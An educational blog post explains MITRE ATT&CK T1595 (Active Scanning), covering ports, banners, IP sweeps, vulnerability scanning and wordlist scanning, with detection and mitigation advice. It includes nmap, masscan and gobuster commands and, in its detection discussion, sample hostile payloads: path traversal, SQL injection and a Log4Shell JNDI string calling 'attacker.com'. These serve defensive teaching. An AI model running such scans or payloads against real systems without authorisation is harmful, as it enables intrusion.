---
title: "[ATT&CK Series] T1595 - Active Scanning"
date: "2026-06-24T00:00:00Z"
tags: ["mitre-attack", "reconnaissance", "red-teaming"]
description: "A deep dive into MITRE ATT&CK Technique T1595 (Active Scanning), exploring how attackers probe networks to map out hosts and vulnerabilities."
series: "MITRE ATT&CK Reconnaissance"
---

**Understand the concept**

## How Attackers Case Your Network Before Striking

_MITRE ATT&CK | Tactic: Reconnaissance | Technique: T1595_

---

### The Burglary Analogy

Before a burglar breaks into a house, they don't just walk up and kick the door in. They observe first — which windows are unlocked, whether there's a dog, what time the lights go off, whether there's a camera above the door.

Active scanning is exactly that, but for networks.

Before an attacker touches your systems, they probe them. They send network traffic at your infrastructure and study what comes back. Every response — even a "no entry" response — tells them something useful. That's T1595 in one sentence: **an attacker actively sending packets at your network to map out what's there.**

The word "active" is important. It means they're directly interacting with your systems — as opposed to passive reconnaissance, where they just read publicly available information without ever touching you.

---

### Foundation First: What You Need to Understand Before T1595 Makes Sense

Before we go deeper, three networking concepts need to be solid in your head. Without these, the rest of this post is just words.

#### What Is a Port and Why Does It Matter?

Think of a server like an office building. The IP address is the street address — it tells you which building. But inside that building, there are hundreds of numbered doors. Those doors are ports.

Every service running on a server listens on a specific port number:

|Port|Service|What it does|
|---|---|---|
|80|HTTP|Unencrypted web traffic|
|443|HTTPS|Encrypted web traffic|
|22|SSH|Remote command-line login (Linux)|
|3389|RDP|Remote desktop (Windows)|
|21|FTP|File transfer|
|3306|MySQL|Database|

When a scanner finds port 3389 open and exposed to the internet, that's not just information — that's an invitation. An attacker sees an open RDP port and immediately thinks: brute force the password, or check if there's a known vulnerability in that RDP version.

Ports have three possible states from a scanner's perspective. Open means a service is actively listening and responding — a live door. Closed means the port exists but nothing is listening behind it — the door is there but locked with nobody inside. Filtered means a firewall is silently dropping the packets — the door appears to not exist at all.

TCP (Transmission Control Protocol) and UDP (User Datagram Protocol) are the two transport protocols ports run on. TCP is reliable — it guarantees delivery and checks that packets arrived correctly. UDP is fast but fire-and-forget — no guarantee. Most services attackers care about (web, SSH, RDP) run on TCP.

#### What Is a Banner?

When you knock on a port that has a service listening, that service often introduces itself. This introduction is called a banner.

For example, connect to port 22 on a Linux server and it might respond:

```
SSH-2.0-OpenSSH_7.4
```

Connect to a web server on port 80 and the HTTP response headers might say:

```
Server: Apache/2.4.49 (Ubuntu)
```

That one line — `Apache/2.4.49` — is intelligence gold for an attacker. They now know the exact software and version running on that server. They search "Apache 2.4.49 CVE" and immediately find CVE-2021-41773, a critical path traversal and remote code execution vulnerability in exactly that version. The banner just handed them their exploit.

This is why good security practice involves **banner grabbing suppression** — configuring services to reveal as little version information as possible in their responses.

#### The 3-Way TCP Handshake

Every TCP connection — whether it's loading a webpage or an attacker probing a port — starts with a handshake. Three steps, always in this order:

```
Attacker                    Server
   |                           |
   |---- SYN ----------------->|   "Hey, can we talk?"
   |                           |
   |<--- SYN-ACK --------------|   "Yes, I'm here"
   |                           |
   |---- ACK ----------------->|   "Great, let's go"
   |                           |
   [ connection established ]
```

SYN means "synchronize" — it's the initial request. SYN-ACK means "synchronize acknowledged" — the server confirms it's alive and listening. ACK means "acknowledged" — the connection is established.

Port scanning exploits this handshake. A full connect scan (`nmap -sT`) completes all three steps, then closes the connection. A SYN scan (`nmap -sS`) — also called a stealth scan — only sends the SYN, waits for SYN-ACK, then sends a RST (reset) to abort without completing the connection. It's faster and leaves fewer logs because a full connection was never established.

Now when you see the phrase "the scanner sent SYN packets to 65,000 ports" — you know exactly what that means at a technical level.

#### Now Explain T1595 in Plain English

Before reading further, close your notes and write three sentences in your own words explaining what T1595 is. If you can do it clearly — you have the foundation. If you can't — re-read the three sections above.

This isn't just an exercise. The discipline of explaining techniques simply is what separates someone who studied ATT&CK from someone who actually knows it.

---

### What Are They Looking For?

When an attacker scans your network, they're building a picture:

- Which IP addresses are alive — is anyone home?
- Which ports are open — which doors exist?
- What services are running on those ports — what's behind each door?
- What version that software is running — is the lock old and broken?

That last one is the real prize. A version number in a banner maps directly to a CVE database. The attacker doesn't need to be clever — they just need to find something unpatched.

---

### The 3 Sub-Techniques

T1595 has three specific methods, each hunting for something slightly different.

#### T1595.001 — Scanning IP Blocks

**ID:** T1595.001 | **Version:** 1.1 | **Last Modified:** 24 October 2025

**What it is:**

Organizations on the internet don't just have one IP address. They own blocks — ranges of sequential addresses all belonging to the same company. For example, a bank might own every IP from `203.94.10.0` to `203.94.10.255`. That's a `/24` block — 256 addresses.

Attackers scan these entire blocks to answer one question: which of these IPs are alive, and what's running on them? Scans may range from simple pings using ICMP requests and responses, all the way to more nuanced scans that reveal host software and versions via server banners or other network artifacts. [MITRE](https://attack.mitre.org/techniques/T1595/001/)

Think of it as the attacker knocking on every door in an entire street, making a list of which houses have someone home, and noting what they can see through the window of each one.

**Tools used:**

`nmap` — The standard. Sends crafted packets at a target range and reports what responds.

bash

```bash
nmap -sV -sC 203.94.10.0/24
# -sV = detect service versions
# -sC = run default scripts
# /24 = scan the whole block of 256 addresses
```

`masscan` — Built for internet-scale speed. Can scan millions of IPs in minutes.

bash

```bash
masscan 203.94.10.0/24 -p 80,443,22,3389
# Scans the block for just those 4 ports — web, HTTPS, SSH, RDP
```

`shodan.io` — Doesn't even need to scan. Shodan continuously scans the entire internet and indexes everything it finds. An attacker can search it like Google. Try searching `org:"your company name"` and see what comes up.

**Real APT groups that used this (from MITRE):**

Ember Bear has targeted IP ranges for vulnerability scanning related to government and critical infrastructure organizations. Ember Bear is a Russian military threat actor linked to GRU Unit 161, documented in a CISA advisory in September 2024. [MITRE](https://attack.mitre.org/techniques/T1595/001/)

TeamTNT has scanned specific lists of target IP addresses. TeamTNT is a cloud-focused threat group known for hijacking exposed cloud infrastructure for cryptocurrency mining. [MITRE](https://attack.mitre.org/techniques/T1595/001/)

**Detection (DET0817 — AN1949):**

Monitoring the content of network traffic can help detect patterns associated with active scanning activities. This includes identifying repeated connection attempts, unusual scanning behaviors, or probing activity targeting multiple IP addresses across a network. Monitor network data for uncommon data flows — processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. [MITRE](https://attack.mitre.org/techniques/T1595/001/)

**What to look for in your logs:**

One source IP making connection attempts to many different destination IPs in a short time window. In your firewall logs, this shows up as the same `src_ip` appearing across dozens of different `dst_ip` entries within seconds. That's the pattern of an IP block sweep.

**Mitigation (M1056 — Pre-compromise):**

This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside the scope of enterprise defenses. Efforts should focus on minimizing the amount and sensitivity of data available to external parties. In practice: close ports you don't need, suppress banners, and scan yourself with Shodan before attackers do. [MITRE](https://attack.mitre.org/techniques/T1595/001/)

#### T1595.002 — Vulnerability Scanning

**ID:** T1595.002 | **Version:** 1.0 | **Last Modified:** 24 October 2025

**What it is:**

Adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host or application — such as software and version — potentially aligns with the target of a specific exploit the adversary may seek to use. These scans may also include more broad attempts to gather victim host information that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts. [MITRE](https://attack.mitre.org/techniques/T1595/002/)

The difference from T1595.001 is precision. IP block scanning finds what's alive. Vulnerability scanning asks a sharper question: is what's alive actually exploitable?

When Shodan or nmap reveals that port 443 is running `Apache/2.4.49`, a vulnerability scanner takes that version number, checks it against a database of known CVEs, and flags: "this version is vulnerable to CVE-2021-41773 — critical severity, remote code execution, no authentication required." The attacker now has a confirmed target and a ready exploit.

**Tools used:**

`Nessus` / `OpenVAS` — Feed them a target IP, get back a full vulnerability report with CVE IDs, severity scores, and remediation advice. Both exist for legitimate security testing. Attackers use the same tools.

`Nuclei` — Template-based scanner. Has thousands of templates for specific CVEs. Fast, lightweight, and very popular in offensive security.

`Acunetix` — Web application vulnerability scanner specifically for finding SQL injection, XSS, and other web vulnerabilities. Used by multiple APT groups.

`Interactsh` — Used to detect out-of-band vulnerabilities like Log4Shell, where the vulnerability is only confirmed when the server makes a DNS or HTTP callback.

**Real APT groups that used this (from MITRE — this sub-technique has the most documented usage of all three):**

APT28 has performed large-scale scans in an attempt to find vulnerable servers. APT28 is Russia's Fancy Bear — responsible for the DNC hack in 2016. [MITRE](https://attack.mitre.org/techniques/T1595/002/)

APT29 has conducted widespread scanning of target environments to identify vulnerabilities for exploit. APT29 is Cozy Bear — behind the SolarWinds supply chain attack. [MITRE](https://attack.mitre.org/techniques/T1595/002/)

APT41 used the Acunetix SQL injection vulnerability scanner in target reconnaissance operations, as well as the JexBoss tool to identify vulnerabilities in Java applications. APT41 is a Chinese state-linked group conducting both espionage and financially motivated attacks. [MITRE](https://attack.mitre.org/techniques/T1595/002/)

Aquatic Panda used publicly accessible DNS logging services to identify servers vulnerable to Log4j (CVE-2021-44228). This was one of the most exploited vulnerabilities of the decade — a critical RCE in the Java logging library used by millions of applications. [MITRE](https://attack.mitre.org/techniques/T1595/002/)

Magic Hound conducted widespread scanning to identify public-facing systems vulnerable to CVE-2021-44228 in Log4j and ProxyShell vulnerabilities in on-premises MS Exchange Servers, as well as CVE-2018-13379 in Fortinet FortiOS SSL VPNs. Magic Hound is an Iranian APT group (also tracked as APT35 / Charming Kitten). [MITRE](https://attack.mitre.org/techniques/T1595/002/)

Ember Bear has used publicly available tools such as MASSCAN and Acunetix for vulnerability scanning of public-facing infrastructure. [MITRE](https://attack.mitre.org/techniques/T1595/002/)

Sandworm Team has scanned network infrastructure for vulnerabilities as part of its operational planning. Sandworm is the Russian GRU unit responsible for the NotPetya wiper attack and Ukraine power grid attacks. [MITRE](https://attack.mitre.org/techniques/T1595/002/)

Winter Vivern has used remotely-hosted instances of the Acunetix vulnerability scanner. Winter Vivern is a threat group targeting European government organizations. [MITRE](https://attack.mitre.org/techniques/T1595/002/)

The pattern across all these groups is the same: scan first, confirm the vulnerability exists, then exploit. They don't guess — they verify before they move.

**Detection (DET0867 — AN1999):**

Monitor and analyze traffic patterns and packet inspection associated with protocols that do not follow expected protocol standards and traffic flows — for example, extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax or structure. Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated with traffic patterns. Monitor network data for uncommon data flows — processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. [MITRE](https://attack.mitre.org/techniques/T1595/002/)

In plain terms: vulnerability scanners generate traffic that looks subtly wrong at the protocol level. An Nessus scan connecting to an SSH port doesn't complete a real SSH session — it probes, gets the banner, and disconnects. A web vulnerability scanner sends HTTP requests with payloads that no real browser would send — `../../../etc/passwd`, `' OR 1=1--`, `${jndi:ldap://attacker.com/a}`. These patterns are detectable in web application firewall logs and IDS signatures.

#### T1595.003 — Wordlist Scanning

**ID:** T1595.003 | **Version:** 1.0 | **Last Modified:** 24 October 2025 | **Contributors:** Elvis Veliz, Jan Petrov, Richard Julian (Citi)

**What it is:**

Adversaries may iteratively probe infrastructure using brute-forcing and crawling techniques. While this technique employs similar methods to Brute Force (T1110), its goal is the identification of content and infrastructure rather than the discovery of valid credentials. Wordlists used in these scans may contain generic, commonly used names and file extensions or terms specific to a particular software. Adversaries may also create custom, target-specific wordlists using data gathered from other Reconnaissance techniques such as Gather Victim Org Information or Search Victim-Owned Websites. [mitre](https://attack.mitre.org/techniques/T1595/003/)

This is directory and content discovery. An attacker takes a wordlist — a text file with thousands of common paths like `admin`, `login`, `config`, `backup`, `old`, `.env`, `phpinfo.php`, `wp-admin`, `api/v1/users` — and fires each one at a web server to see which return a valid response instead of a 404.

What they find determines the next attack. An exposed `/admin` panel gets brute-forced for credentials. A `/backup.zip` gets downloaded and unpacked for credentials and source code. A `.env` file sitting in the web root gets read — and often contains database connection strings, API keys, and cloud credentials in plain text. These mistakes happen constantly in real production environments.

This can help attackers discover old, vulnerable pages or hidden administrative portals that could become the target of further operations such as Exploit Public-Facing Application (T1190) or Brute Force (T1110). [mitre](https://attack.mitre.org/techniques/T1595/003/)

**Cloud storage extension:**

As cloud storage solutions typically use globally unique names, adversaries may also use target-specific wordlists and tools such as s3recon and GCPBucketBrute to enumerate public and private buckets on cloud infrastructure. Once storage objects are discovered, adversaries may leverage Data from Cloud Storage (T1530) to access valuable information that can be exfiltrated or used to escalate privileges and move laterally. [mitre](https://attack.mitre.org/techniques/T1595/003/)

A company named "Acme Corp" might have S3 buckets named `acme-backups`, `acme-dev`, `acme-hr-files`, `acmecorp-internal`. Attackers build wordlists from the company name and common suffixes, then check each one. A misconfigured bucket set to public read is an instant data breach.

**Tools used:**

`gobuster` — Fast, Go-based directory and DNS brute-forcer.

bash

```bash
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
# Tries every entry in common.txt as a URL path on target.com
```

`ffuf` — Fuzzing tool used for both directory discovery and parameter fuzzing.

`DirBuster` — Java GUI tool, very commonly used.

`s3recon` — Specifically for AWS S3 bucket enumeration.

`GCPBucketBrute` — For Google Cloud Platform storage bucket enumeration.

**Real APT groups that used this (from MITRE):**

APT41 leverages various tools and frameworks to brute-force directories on web servers. [mitre](https://attack.mitre.org/techniques/T1110/)

Volatile Cedar has used DirBuster and GoBuster to brute force web directories and DNS subdomains. Volatile Cedar (also known as Lebanese Cedar) is a Lebanese threat group documented conducting long-running web server intrusion campaigns against targets in the Middle East, US, and Europe. [mitre](https://attack.mitre.org/techniques/T1595/003/)

**Detection (DET0868 — AN2000):**

Monitor for suspicious network traffic that could be indicative of scanning, such as large quantities originating from a single source, especially if the source is known to be associated with an adversary or botnet. [mitre](https://attack.mitre.org/techniques/T1595/003/)

The clearest signal in your web server logs: one IP address generating hundreds or thousands of 404 responses in a short time. A normal user browsing a website doesn't hit hundreds of non-existent pages. A gobuster run does — every wordlist entry that doesn't exist returns a 404, and they arrive in rapid sequence.

**Mitigation — two controls apply here, not one:**

M1056 (Pre-compromise): same as the others — reduce what's exposed.

M1042 (Disable or Remove Feature or Program): Remove or disable access to any systems, resources, and infrastructure that are not explicitly required to be available externally. This is the actionable one for T1595.003 specifically — don't leave admin panels, backup files, or development endpoints reachable on production servers. If it doesn't need to be there, remove it. What can't be found can't be attacked. [mitre](https://attack.mitre.org/techniques/T1595/003/)


---

### What Evidence Does It Leave?

This is where you switch from attacker's mindset to defender's mindset.

Active scanning is noisier than passive recon, but the noise blends into normal internet background traffic if you're not watching for specific patterns.

**Firewall logs** will show connection attempts to ports that have no legitimate reason to receive external traffic, or a single IP address hitting many different ports in a short window — the port scan signature.

**Web server access logs** fill up with 404 errors during wordlist scanning. One IP requesting `/admin`, `/backup`, `/config.php`, `/old`, `/test` — each returning 404 — is a textbook gobuster run visible in any access log.

**Packet captures in Wireshark** make it visually obvious. One IP sending SYN packets to port 22, then 80, then 443, then 3389, then 8080, then 8443 — in rapid sequence. That pattern is immediately recognizable as a scan when you see it at the packet level.

**IDS/IPS tools** like Snort and Suricata have built-in signatures for scan patterns — SYN floods to multiple ports, ICMP sweeps, service fingerprinting attempts. They fire automatically when thresholds are crossed.

The MITRE detection strategy for T1595 points to two data sources: Network Traffic Content (DC0085) and Network Traffic Flow (DC0078). In plain terms — you need to be collecting and analyzing your network traffic to catch this. Firewall logs alone aren't enough.

---

### Where This Leads

Scanning is never the end goal. It's intelligence that feeds the next move.

An open RDP port leads to T1133 (External Remote Services) or brute force credential attacks. A vulnerable Apache version leads to T1190 (Exploit Public-Facing Application). Exposed cloud buckets lead to data theft or privilege escalation paths. A hidden admin panel found by wordlist scanning becomes the entry point for the entire intrusion.

This is why Reconnaissance sits at the far left of the ATT&CK matrix. Everything gathered here shapes every decision in the attack chain that follows.

---

### Key Takeaways

T1595 is the attacker's first direct move — probing your network to map what exists and find weak spots. Understanding it properly requires knowing what ports are, how banners reveal software versions, and how the TCP handshake works at the packet level — because that's what scanning actually manipulates.

The technique has three forms: broad IP sweeps to find live hosts, targeted vulnerability scans to find exploitable software, and wordlist brute-forcing to uncover hidden web content and cloud buckets. Real nation-state APT groups from Russia, China, and Lebanon use these methods as the opening move of documented campaigns.

Detection relies on recognizing the pattern — too many ports, too many 404s, too many connections from one source. Prevention focuses on shrinking and hardening what they can find before they look.
